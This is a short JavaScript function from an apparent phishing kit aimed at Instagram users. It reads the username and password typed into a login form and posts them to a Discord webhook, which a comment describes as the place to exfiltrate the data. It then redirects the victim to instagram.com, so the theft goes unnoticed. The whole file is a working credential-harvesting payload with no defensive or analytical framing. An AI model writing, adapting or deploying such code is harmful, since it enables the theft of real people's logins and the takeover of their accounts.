async function send_login() {
    // SET YOUR DISCORD WEBHOOK or whatever you want to exfiltrate the data
    const discord_webhook_url = "";

    // Retrieve data from POST form
    const username = document.getElementById('fa4e2a34ab06a').value;
    const password = document.getElementById('faa2da1ad083').value;

    // Create message content
    const message = "Username: " + username + " \n " + "Password: " + password;

    try {
        // Send POST request to Discord webhook URL
        const response = await fetch(discord_webhook_url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: message })
        });
        // If response is successful, redirect to Instagram
        if (response.ok) {
            window.location.href = "https://instagram.com";
        } else {
            // Otherwise, throw a generic error
            throw new Error('Generic error!');
        }
    } catch (error) {
        // Log any errors to the console
        console.error(error);
    }

}